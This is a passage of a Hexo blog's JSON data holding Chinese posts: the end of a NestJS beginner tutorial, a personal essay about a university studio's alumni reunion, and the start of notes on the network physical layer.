title=\"三、知识准备\"></a>三、知识准备</h1><p>由于 NestJs 是基于 Node 的环境，因此需要具备基础的知识。</p><ul><li>HTTP: 了解基本的 Get、Post 请求</li><li>Node：基本明白接口请求，知道服务与接口关系即可</li><li>Typescript：基本懂语法，能大致知道装饰器和 interface</li></ul><p>最好之前用过 Node 相关服务，使用 Node 搭建过后台服务，但这不是必要的。</p><h1 id=\"四、开发准备\"><a href=\"#四、开发准备\" class=\"headerlink\" title=\"四、开发准备\"></a>四、开发准备</h1><p>1、安装 Node 环境：访问 <a href=\"https://nodejs.org/en/download/\" target=\"_blank\" rel=\"noopener\">Node 下载地址</a>. 下载安装后，Node &gt;= 10.13.0 即可, 可通过命令行检查</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node -v</span><br></pre></td></tr></table></figure><p>2、安装 NestJS cli</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -g @nestjs/cli</span><br></pre></td></tr></table></figure><h1 id=\"五、Hello-World\"><a href=\"#五、Hello-World\" class=\"headerlink\" title=\"五、Hello World\"></a>五、Hello World</h1><h2 id=\"创建-nest-test-项目\"><a href=\"#创建-nest-test-项目\" class=\"headerlink\" title=\"创建 nest-test 项目\"></a>创建 nest-test 项目</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// step1</span><br><span class=\"line\">nest new nest-test</span><br><span class=\"line\"></span><br><span class=\"line\">// step2 Which package manager would you</span><br><span class=\"line\">选择: npm</span><br></pre></td></tr></table></figure><h2 id=\"目录结构\"><a href=\"#目录结构\" class=\"headerlink\" title=\"目录结构\"></a>目录结构</h2><p>这样就得到了 src/ 目录为这样的文件列表了<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src</span><br><span class=\"line\">  |- app.controller.spec.ts // controller 的测试文件</span><br><span class=\"line\">  |- app.controller.ts      // controller，路由和预处理</span><br><span class=\"line\">  |- app.module.ts          // module，为模块注册用</span><br><span class=\"line\">  |- app.service.ts         // service 真正的逻辑</span><br><span class=\"line\">  |- main.ts                // 程序入口</span><br></pre></td></tr></table></figure><p></p><p>NestJS 也主张的是 <a href=\"https://zh.wikipedia.org/wiki/MVC\" target=\"_blank\" rel=\"noopener\">MVC</a> 的格式。</p><h2 id=\"module\"><a href=\"#module\" class=\"headerlink\" title=\"module\"></a>module</h2><p><img src=\"/nestJs/nest-js-tutorial-1/module.png\" alt=\"module\"></p><p>module 的作用是在程序运行时给模块处理依赖。好处是所有模块的依赖都可以在 module 中清晰明了的知道引用还是被引用</p><h2 id=\"controller\"><a href=\"#controller\" class=\"headerlink\" title=\"controller\"></a>controller</h2><p><img src=\"/nestJs/nest-js-tutorial-1/controllers.png\" alt=\"controller\"></p><p>controller 的作用是处理请求，所有的请求会先到 controller，再经 controller 调用其他模块业务逻辑</p><h2 id=\"service\"><a href=\"#service\" class=\"headerlink\" title=\"service\"></a>service</h2><p>是真正处理业务逻辑的地方，所有的业务逻辑都会在这里处理。它可经过 module 引用其他模块的service，也可经过 module 暴露出去。</p><h2 id=\"hello-world\"><a href=\"#hello-world\" class=\"headerlink\" title=\"hello-world\"></a>hello-world</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// step1: 进入目录</span><br><span class=\"line\">cd nest-test</span><br><span class=\"line\"></span><br><span class=\"line\">// step2: 安装依赖或更新依赖</span><br><span class=\"line\">npm install</span><br><span class=\"line\"></span><br><span class=\"line\">// step3: 运行程序</span><br><span class=\"line\">npm run start</span><br></pre></td></tr></table></figure><p>最后浏览器访问url</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">访问: http://localhost:3000/</span><br><span class=\"line\">// =&gt; Hello World!</span><br></pre></td></tr></table></figure><p>说明程序已经成功访问了！</p><h1 id=\"六、生成新模块\"><a href=\"#六、生成新模块\" class=\"headerlink\" title=\"六、生成新模块\"></a>六、生成新模块</h1><h2 id=\"执行命令\"><a href=\"#执行命令\" class=\"headerlink\" title=\"执行命令\"></a>执行命令</h2><p>能访问新模块了，再进一步期望生成文件夹和文件夹的模块。NestJS cli 也支持用命令行形式来创建，这样就不需要做重复的创建文件的动作了。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nest g controller students</span><br><span class=\"line\">nest g service students</span><br><span class=\"line\">nest g module students</span><br></pre></td></tr></table></figure><p></p><h2 id=\"目录结构-1\"><a href=\"#目录结构-1\" class=\"headerlink\" title=\"目录结构\"></a>目录结构</h2><p>再命令行分别执行以上三条命令，src/ 目录变成了如下样子<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src</span><br><span class=\"line\">  |- app.controller.spec.ts</span><br><span class=\"line\">  |- app.controller.ts     </span><br><span class=\"line\">  |- app.module.ts         </span><br><span class=\"line\">  |- app.service.ts        </span><br><span class=\"line\">  |- main.ts               </span><br><span class=\"line\">  |- students/</span><br><span class=\"line\">        |- students.controller.spec.ts</span><br><span class=\"line\">        |- students.controller.ts     </span><br><span class=\"line\">        |- students.module.ts         </span><br><span class=\"line\">        |- students.service.spec.ts</span><br><span class=\"line\">        |- students.service.ts</span><br></pre></td></tr></table></figure><p></p><h2 id=\"编辑文件\"><a href=\"#编辑文件\" class=\"headerlink\" title=\"编辑文件\"></a>编辑文件</h2><p>编辑如下文件:<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    ImStudent() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Im student'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    ImStudent() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Im student'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>重启服务, 加上 dev 就能监听文件修改了。<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run start:dev</span><br></pre></td></tr></table></figure><p></p><p>最后浏览器访问url</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">http://localhost:3000/students/who-are-you</span><br><span class=\"line\">// =&gt; Im student</span><br></pre></td></tr></table></figure><p>这样模块添加完成了</p><p>如果你看到了这里，说明你真的对 NestJS 很感兴趣。<a href=\"/nestJs/nest-js-tutorial-2/\" title=\"下章\">下章</a>将会对接口再深入细化。</p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到</p>"},{"title":"家园校友会--家园人回家","date":"2017-10-30T13:04:18.000Z","dir":"ncuhome","_content":"#### 写在前面\n看到以往的学长学姐风风火火的从世界各地赶到家园参加这次举办的家园校友会，感触良多。多年后的自己能否会和他们一样，早早实现财务自由，为自己的青春年华的付出，再次奉献一份力呢？看到南昌大学家园网，再到现在的南昌大学家园工作室，变了种种种种。可是家园人回家探亲的那一刻，他们依然把这里当作家，熟悉感依然在。也希望若干年后的我，能为家园奉献这一份力。\n\n#### 家园校友会的成立\n家园校友会在昨天成立了。听了好多关于他为什么成立的版本，出于行政上，出于物资上，出于情感上。可能各个方面的建设不一样，或者说在各个层面的位置看到它成立的作用不一样。但是我还是觉得不应该用一种负面的态度去看待整件事情。作为家园人，应该以一种纯粹的态度去看待它，认为家园校友会的成立就是为了帮助我们家园工作室更好的发展，利用之前的学长学姐的资源，让家园人更好的去发展，仅此而已。虽然作为中心组的管理层，但是我觉得家园是一个家，没必要从一种政治上的角度去考量证件事情。所以对于我个人而言，家园校友会的成立会为了我们家园人的发展，作出更好的贡献，让家园人变得更好。也是家园人凝聚的一种实力。\n\n#### 和学长的聊天\n##### 提问环节\n讲真，在整天的聊天过程之中，最大的收获是和汪涛学长聊天了。在我向大家提问过人工智能这一个话题之后，汪涛学长对于这个话题有一些很深刻的认识。他认为我们目前的人工智能还是处于搬砖的弱人工智能，对于今后还有很大的提升。还有人工智能的高层是数学家玩的，并不是我们常人能够去接触的。听到这里，心里震惊了一下，虽然很失望，但是对人工智能有了一定的了解。也对腾讯这个公司有了一定的了解。\n\n#### 单对单的talking\n学长从主教302（我们开座谈会的地方）到机房和我们聊天，我单独和学长聊了聊工作室的基本情况，工作室面临的问题。他对工作室的现状虽然没有表现出堪忧的态度，但是对工作室的体制化，制度化表示了一些质疑。他告诉我说制度这种东西，有好处也有坏处。好处是大家能够更规范的去做事情，但坏处就是它没有之前那么纯粹，磨灭了大家对执着技术的热情。当然，技术的热情确实从历届学长学姐的眼里，我们确实没有以前那么高了。可能一味的追求某种东西，到最后就忘了自己的初衷。而家园研发在我手上，希望让他更强大，更和以前那么纯粹。因此我极度期望去改革，去把事情变得纯粹一些。关于技术问题，我们的技术确实存在某些弊端，比方说对将来要工作或者其他考量。我感觉，现在是把工作室的地位降低，而不是纯粹的追求技术，我们确实把自己当作一个工厂，一个去造就名企名业的工厂，只是一个免费的培训机构而已。而这件事情我们确实需要重新审视一下自己。技术上：学长认为python是入门级，轻量化的一个东西，可以作为快速开发，快速看创造出的原型，而java和c#作为两门很好的语言，去琢磨它，去吃透它，是整个大学的必修课。也是作为到社会之后快速学习的一种手段，或者说一种桥梁。因此对于java和python，我的意图是重学，甚至作为整个大组的基准，去学习。整个研发在我接手那一刻，发现确实存在一些问题，例如大家很少来机房，在技术上只是作为工厂者在创造名企。而整个工作室确实少了一些像家的感觉，等等。也期望大家能多学一些，然后多去用，多去创造吧。是真正想因为技术在一起的。\n\n#### 写在最后\n说实话，昨天是我从大学到现在以来，第一次和这么多大佬一起相聚，有腾讯基础架构师，现在在做人工智能，有原迅雷的cto，现在在做大数据，也有针对外企的汪涛学长，一直在很努力的尝试不同种类的coding;有政界大牛，也有商界大咖，coding界的佼佼者……真心感觉自己很菜，自己还需要学习更多。从第一届家园人中看到更多希望和期许，从历届的家园人中看到友谊天长地久的长存，感觉良多。发现我们不仅仅是一个社团组织，而是更是一群追梦人，为了纯粹的技术，为了纯粹的事情聚在一起。家园就是期望和家一样，越来越好。而公司化or社团化，体制化or自由化，应该就不言而喻了吧。","source":"_posts/meet-ncuhomer.md","raw":"---\ntitle: 家园校友会--家园人回家\ndate: 2017-10-30 21:04:18\ntags: ncuhome\ndir: ncuhome\n---\n#### 写在前面\n看到以往的学长学姐风风火火的从世界各地赶到家园参加这次举办的家园校友会，感触良多。多年后的自己能否会和他们一样，早早实现财务自由，为自己的青春年华的付出，再次奉献一份力呢？看到南昌大学家园网，再到现在的南昌大学家园工作室，变了种种种种。可是家园人回家探亲的那一刻，他们依然把这里当作家，熟悉感依然在。也希望若干年后的我，能为家园奉献这一份力。\n\n#### 家园校友会的成立\n家园校友会在昨天成立了。听了好多关于他为什么成立的版本，出于行政上，出于物资上，出于情感上。可能各个方面的建设不一样，或者说在各个层面的位置看到它成立的作用不一样。但是我还是觉得不应该用一种负面的态度去看待整件事情。作为家园人，应该以一种纯粹的态度去看待它，认为家园校友会的成立就是为了帮助我们家园工作室更好的发展，利用之前的学长学姐的资源，让家园人更好的去发展，仅此而已。虽然作为中心组的管理层，但是我觉得家园是一个家，没必要从一种政治上的角度去考量证件事情。所以对于我个人而言，家园校友会的成立会为了我们家园人的发展，作出更好的贡献，让家园人变得更好。也是家园人凝聚的一种实力。\n\n#### 和学长的聊天\n##### 提问环节\n讲真，在整天的聊天过程之中，最大的收获是和汪涛学长聊天了。在我向大家提问过人工智能这一个话题之后，汪涛学长对于这个话题有一些很深刻的认识。他认为我们目前的人工智能还是处于搬砖的弱人工智能，对于今后还有很大的提升。还有人工智能的高层是数学家玩的，并不是我们常人能够去接触的。听到这里，心里震惊了一下，虽然很失望，但是对人工智能有了一定的了解。也对腾讯这个公司有了一定的了解。\n\n#### 单对单的talking\n学长从主教302（我们开座谈会的地方）到机房和我们聊天，我单独和学长聊了聊工作室的基本情况，工作室面临的问题。他对工作室的现状虽然没有表现出堪忧的态度，但是对工作室的体制化，制度化表示了一些质疑。他告诉我说制度这种东西，有好处也有坏处。好处是大家能够更规范的去做事情，但坏处就是它没有之前那么纯粹，磨灭了大家对执着技术的热情。当然，技术的热情确实从历届学长学姐的眼里，我们确实没有以前那么高了。可能一味的追求某种东西，到最后就忘了自己的初衷。而家园研发在我手上，希望让他更强大，更和以前那么纯粹。因此我极度期望去改革，去把事情变得纯粹一些。关于技术问题，我们的技术确实存在某些弊端，比方说对将来要工作或者其他考量。我感觉，现在是把工作室的地位降低，而不是纯粹的追求技术，我们确实把自己当作一个工厂，一个去造就名企名业的工厂，只是一个免费的培训机构而已。而这件事情我们确实需要重新审视一下自己。技术上：学长认为python是入门级，轻量化的一个东西，可以作为快速开发，快速看创造出的原型，而java和c#作为两门很好的语言，去琢磨它，去吃透它，是整个大学的必修课。也是作为到社会之后快速学习的一种手段，或者说一种桥梁。因此对于java和python，我的意图是重学，甚至作为整个大组的基准，去学习。整个研发在我接手那一刻，发现确实存在一些问题，例如大家很少来机房，在技术上只是作为工厂者在创造名企。而整个工作室确实少了一些像家的感觉，等等。也期望大家能多学一些，然后多去用，多去创造吧。是真正想因为技术在一起的。\n\n#### 写在最后\n说实话，昨天是我从大学到现在以来，第一次和这么多大佬一起相聚，有腾讯基础架构师，现在在做人工智能，有原迅雷的cto，现在在做大数据，也有针对外企的汪涛学长，一直在很努力的尝试不同种类的coding;有政界大牛，也有商界大咖，coding界的佼佼者……真心感觉自己很菜，自己还需要学习更多。从第一届家园人中看到更多希望和期许，从历届的家园人中看到友谊天长地久的长存，感觉良多。发现我们不仅仅是一个社团组织，而是更是一群追梦人，为了纯粹的技术，为了纯粹的事情聚在一起。家园就是期望和家一样，越来越好。而公司化or社团化，体制化or自由化，应该就不言而喻了吧。","slug":"meet-ncuhomer","published":1,"updated":"2021-09-11T05:01:20.051Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz05000r4jzxjnoy5hbk","content":"<h4 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h4><p>看到以往的学长学姐风风火火的从世界各地赶到家园参加这次举办的家园校友会，感触良多。多年后的自己能否会和他们一样，早早实现财务自由，为自己的青春年华的付出，再次奉献一份力呢？看到南昌大学家园网，再到现在的南昌大学家园工作室，变了种种种种。可是家园人回家探亲的那一刻，他们依然把这里当作家，熟悉感依然在。也希望若干年后的我，能为家园奉献这一份力。</p><h4 id=\"家园校友会的成立\"><a href=\"#家园校友会的成立\" class=\"headerlink\" title=\"家园校友会的成立\"></a>家园校友会的成立</h4><p>家园校友会在昨天成立了。听了好多关于他为什么成立的版本，出于行政上，出于物资上，出于情感上。可能各个方面的建设不一样，或者说在各个层面的位置看到它成立的作用不一样。但是我还是觉得不应该用一种负面的态度去看待整件事情。作为家园人，应该以一种纯粹的态度去看待它，认为家园校友会的成立就是为了帮助我们家园工作室更好的发展，利用之前的学长学姐的资源，让家园人更好的去发展，仅此而已。虽然作为中心组的管理层，但是我觉得家园是一个家，没必要从一种政治上的角度去考量证件事情。所以对于我个人而言，家园校友会的成立会为了我们家园人的发展，作出更好的贡献，让家园人变得更好。也是家园人凝聚的一种实力。</p><h4 id=\"和学长的聊天\"><a href=\"#和学长的聊天\" class=\"headerlink\" title=\"和学长的聊天\"></a>和学长的聊天</h4><h5 id=\"提问环节\"><a href=\"#提问环节\" class=\"headerlink\" title=\"提问环节\"></a>提问环节</h5><p>讲真，在整天的聊天过程之中，最大的收获是和汪涛学长聊天了。在我向大家提问过人工智能这一个话题之后，汪涛学长对于这个话题有一些很深刻的认识。他认为我们目前的人工智能还是处于搬砖的弱人工智能，对于今后还有很大的提升。还有人工智能的高层是数学家玩的，并不是我们常人能够去接触的。听到这里，心里震惊了一下，虽然很失望，但是对人工智能有了一定的了解。也对腾讯这个公司有了一定的了解。</p><h4 id=\"单对单的talking\"><a href=\"#单对单的talking\" class=\"headerlink\" title=\"单对单的talking\"></a>单对单的talking</h4><p>学长从主教302（我们开座谈会的地方）到机房和我们聊天，我单独和学长聊了聊工作室的基本情况，工作室面临的问题。他对工作室的现状虽然没有表现出堪忧的态度，但是对工作室的体制化，制度化表示了一些质疑。他告诉我说制度这种东西，有好处也有坏处。好处是大家能够更规范的去做事情，但坏处就是它没有之前那么纯粹，磨灭了大家对执着技术的热情。当然，技术的热情确实从历届学长学姐的眼里，我们确实没有以前那么高了。可能一味的追求某种东西，到最后就忘了自己的初衷。而家园研发在我手上，希望让他更强大，更和以前那么纯粹。因此我极度期望去改革，去把事情变得纯粹一些。关于技术问题，我们的技术确实存在某些弊端，比方说对将来要工作或者其他考量。我感觉，现在是把工作室的地位降低，而不是纯粹的追求技术，我们确实把自己当作一个工厂，一个去造就名企名业的工厂，只是一个免费的培训机构而已。而这件事情我们确实需要重新审视一下自己。技术上：学长认为python是入门级，轻量化的一个东西，可以作为快速开发，快速看创造出的原型，而java和c#作为两门很好的语言，去琢磨它，去吃透它，是整个大学的必修课。也是作为到社会之后快速学习的一种手段，或者说一种桥梁。因此对于java和python，我的意图是重学，甚至作为整个大组的基准，去学习。整个研发在我接手那一刻，发现确实存在一些问题，例如大家很少来机房，在技术上只是作为工厂者在创造名企。而整个工作室确实少了一些像家的感觉，等等。也期望大家能多学一些，然后多去用，多去创造吧。是真正想因为技术在一起的。</p><h4 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h4><p>说实话，昨天是我从大学到现在以来，第一次和这么多大佬一起相聚，有腾讯基础架构师，现在在做人工智能，有原迅雷的cto，现在在做大数据，也有针对外企的汪涛学长，一直在很努力的尝试不同种类的coding;有政界大牛，也有商界大咖，coding界的佼佼者……真心感觉自己很菜，自己还需要学习更多。从第一届家园人中看到更多希望和期许，从历届的家园人中看到友谊天长地久的长存，感觉良多。发现我们不仅仅是一个社团组织，而是更是一群追梦人，为了纯粹的技术，为了纯粹的事情聚在一起。家园就是期望和家一样，越来越好。而公司化or社团化，体制化or自由化，应该就不言而喻了吧。</p>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h4><p>看到以往的学长学姐风风火火的从世界各地赶到家园参加这次举办的家园校友会，感触良多。多年后的自己能否会和他们一样，早早实现财务自由，为自己的青春年华的付出，再次奉献一份力呢？看到南昌大学家园网，再到现在的南昌大学家园工作室，变了种种种种。可是家园人回家探亲的那一刻，他们依然把这里当作家，熟悉感依然在。也希望若干年后的我，能为家园奉献这一份力。</p><h4 id=\"家园校友会的成立\"><a href=\"#家园校友会的成立\" class=\"headerlink\" title=\"家园校友会的成立\"></a>家园校友会的成立</h4><p>家园校友会在昨天成立了。听了好多关于他为什么成立的版本，出于行政上，出于物资上，出于情感上。可能各个方面的建设不一样，或者说在各个层面的位置看到它成立的作用不一样。但是我还是觉得不应该用一种负面的态度去看待整件事情。作为家园人，应该以一种纯粹的态度去看待它，认为家园校友会的成立就是为了帮助我们家园工作室更好的发展，利用之前的学长学姐的资源，让家园人更好的去发展，仅此而已。虽然作为中心组的管理层，但是我觉得家园是一个家，没必要从一种政治上的角度去考量证件事情。所以对于我个人而言，家园校友会的成立会为了我们家园人的发展，作出更好的贡献，让家园人变得更好。也是家园人凝聚的一种实力。</p><h4 id=\"和学长的聊天\"><a href=\"#和学长的聊天\" class=\"headerlink\" title=\"和学长的聊天\"></a>和学长的聊天</h4><h5 id=\"提问环节\"><a href=\"#提问环节\" class=\"headerlink\" title=\"提问环节\"></a>提问环节</h5><p>讲真，在整天的聊天过程之中，最大的收获是和汪涛学长聊天了。在我向大家提问过人工智能这一个话题之后，汪涛学长对于这个话题有一些很深刻的认识。他认为我们目前的人工智能还是处于搬砖的弱人工智能，对于今后还有很大的提升。还有人工智能的高层是数学家玩的，并不是我们常人能够去接触的。听到这里，心里震惊了一下，虽然很失望，但是对人工智能有了一定的了解。也对腾讯这个公司有了一定的了解。</p><h4 id=\"单对单的talking\"><a href=\"#单对单的talking\" class=\"headerlink\" title=\"单对单的talking\"></a>单对单的talking</h4><p>学长从主教302（我们开座谈会的地方）到机房和我们聊天，我单独和学长聊了聊工作室的基本情况，工作室面临的问题。他对工作室的现状虽然没有表现出堪忧的态度，但是对工作室的体制化，制度化表示了一些质疑。他告诉我说制度这种东西，有好处也有坏处。好处是大家能够更规范的去做事情，但坏处就是它没有之前那么纯粹，磨灭了大家对执着技术的热情。当然，技术的热情确实从历届学长学姐的眼里，我们确实没有以前那么高了。可能一味的追求某种东西，到最后就忘了自己的初衷。而家园研发在我手上，希望让他更强大，更和以前那么纯粹。因此我极度期望去改革，去把事情变得纯粹一些。关于技术问题，我们的技术确实存在某些弊端，比方说对将来要工作或者其他考量。我感觉，现在是把工作室的地位降低，而不是纯粹的追求技术，我们确实把自己当作一个工厂，一个去造就名企名业的工厂，只是一个免费的培训机构而已。而这件事情我们确实需要重新审视一下自己。技术上：学长认为python是入门级，轻量化的一个东西，可以作为快速开发，快速看创造出的原型，而java和c#作为两门很好的语言，去琢磨它，去吃透它，是整个大学的必修课。也是作为到社会之后快速学习的一种手段，或者说一种桥梁。因此对于java和python，我的意图是重学，甚至作为整个大组的基准，去学习。整个研发在我接手那一刻，发现确实存在一些问题，例如大家很少来机房，在技术上只是作为工厂者在创造名企。而整个工作室确实少了一些像家的感觉，等等。也期望大家能多学一些，然后多去用，多去创造吧。是真正想因为技术在一起的。</p><h4 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h4><p>说实话，昨天是我从大学到现在以来，第一次和这么多大佬一起相聚，有腾讯基础架构师，现在在做人工智能，有原迅雷的cto，现在在做大数据，也有针对外企的汪涛学长，一直在很努力的尝试不同种类的coding;有政界大牛，也有商界大咖，coding界的佼佼者……真心感觉自己很菜，自己还需要学习更多。从第一届家园人中看到更多希望和期许，从历届的家园人中看到友谊天长地久的长存，感觉良多。发现我们不仅仅是一个社团组织，而是更是一群追梦人，为了纯粹的技术，为了纯粹的事情聚在一起。家园就是期望和家一样，越来越好。而公司化or社团化，体制化or自由化，应该就不言而喻了吧。</p>"},{"title":"计算机网络--物理层","date":"2018-01-17T13:53:49.000Z","dir":"计算机网络","keywords":"计算机网络--物理层","_content":"* 物理层概念\n机械特性：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等等。\n电气特性：指明在接口电缆的各条线上出现的电压的范围。\n功能特性：指明某条线上出现的某一电平的电压表示何种意义。\n过程特性：指明对于不同功能的各种可能事件的出现顺序。\n\n* 物理层作用\n计算机网络设备之间的连接必须依靠物理层的传输介质和相关协议进行。物理层主要负责在物理传输介质之上为“数据链路层”提供一个原始比特流（也就是数据是以一个个0或1的二进制代码形式表示的）的物理连接。其具体作用如下：\n\n* 构建数据通路\n“数据通路”就是完整的数据传输通道，可以是一段物理介质，也可以是由多段物理介质连接而成的。一次完整的数据传输，包括激活物理连接、传送数据、终止物理连接三个主要阶段。所谓“激活物理连接”，就是不管有多少段物理介质参与，在通信的两个数据终端设备间都要在电气上连接起来，形成一条可以在上面连续传输数据的通路。\n\n* 透明传输\n物理层中可用的传输介质类型（如不同类型的同轴电缆、双绞线和光纤等）非常多，各自又有相应的通信协议和标准来支持，这就决定了不同的计算机网络可能有不同的“路”。物理层除了要把这些不同的“路”修好外，还要确保这些不同的“路”能“连通”起来，形成通路，最终实现把比特流传输到对端“物理层”，然后向“数据链路层”提交的目的。\n\n* 要实现上述功能，需要物理层具有屏蔽不同传输介质类型和通信协议的功能，让进行网络通信的各方只看到有“路”可行，而不管修这些“路”所用的具体“材料”和相关标准，这就是物理层的“透明传输”功能。\n\n* 传输数据\n无论是从网络体系结构中哪层发起的通信，最终的数据都得通过最低的“物理层”传输出去，因为这是网络通信的唯一物理通道。但“物理层”的传输单位是比特（bit，也就是“位”，数据中的一个二进制的0或1就代表1位）。“物理层”的基本作用是在发送端通过物理层接口和传输介质将数据按比特流的顺序传送到接收端的物理层。\n\n* 数据编码\n要使数据能在“物理层”上有效、可靠地传输，最关键的是要确保数据比特流能在对应的“信道”中正常通过。这就涉及“物理层”的数据编码功能，因为不同传输介质所支持的数据编码类型不一样（如归零码、非归零码、曼彻斯特码、差分曼彻斯特码等）。\n\n* 信道的极限容量\n任何信道中，码元的传输的速率是有上限的，传输的速率超过上限，就会出现严重的码建传绕问题，是的接受段对码元的判决成为不可能。因此有了香浓公式C = Wlog2(1+S/N);\n\n* 数据传输管理\n“物理层”还具有一定的数据传输管理功能，如基于比特流的数据传输流量控制、差错控制、物理线路的激活和释放等。\n![computer_internet](computer_internet.png)\n#### 信道复用\n##### 频分复用（FDM）\n载波带宽(请注意，这里的“带宽”是频率带宽而不是数据的发送速率，每个子信道可以并行传送一路信号。FDM 用于模拟传输过程。\ne.g.——-广电HFC网络电视信号(FDM)\n```\nOFDM 正交频分复用\nOFDM系统比FDM系统要求的带宽要小得多,效率更高\ne.g.——-非对称的数字用户环线(ADSL)、数字视频广播(DVB)、高清晰度电视(HDTV)、无线局域网(WLAN)和第4代(4G)移动通信系统\n```\n#### 时分复用（TDM）\n在交互时间间隔内在同一信道上传送多路信号。TDM 广泛用于数字传输过程。\n可能造成线路浪费，TDM信号又称的等时信号。\ne.g.——–SDH（同步数字体系），ATM(异步传输模式)，IP和HFC网络中CM（电缆调制解调器）与CMTS（电缆调制解调器终端系统）的通信\n#### 波分复用（WDM）\n光的频分复用。在一根光纤上使用不同波长同时传送多路光波信号。WDM 用于光纤信道。WDM与FDM 基于相同原理但它应用于光纤信道的光波传输过程。\n\n#### 码分复用（CDM）\n每个信道作为编码信道实现位传输（特定脉冲序列）。这种编码传输方式通过传输唯一的时间系列短脉冲完成，但在较长的位时间中则采用时间片断替代。每个信道，都有各自的代码，并可以在同一光纤上进行传输以及异步解除复用。","source":"_posts/computer-network-chapter2.md","raw":"---\ntitle: 计算机网络--物理层\ndate: 2018-01-17 21:53:49\ntags: 计算机网络\ndir: 计算机网络\nkeywords: 计算机网络--物理层\n---\n* 物理层概念\n机械特性：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等等。\n电气特性：指明在接口电缆的各条线上出现的电压的范围。\n功能特性：指明某条线上出现的某一电平的电压表示何种意义。\n过程特性：指明对于不同功能的各种可能事件的出现顺序。\n\n* 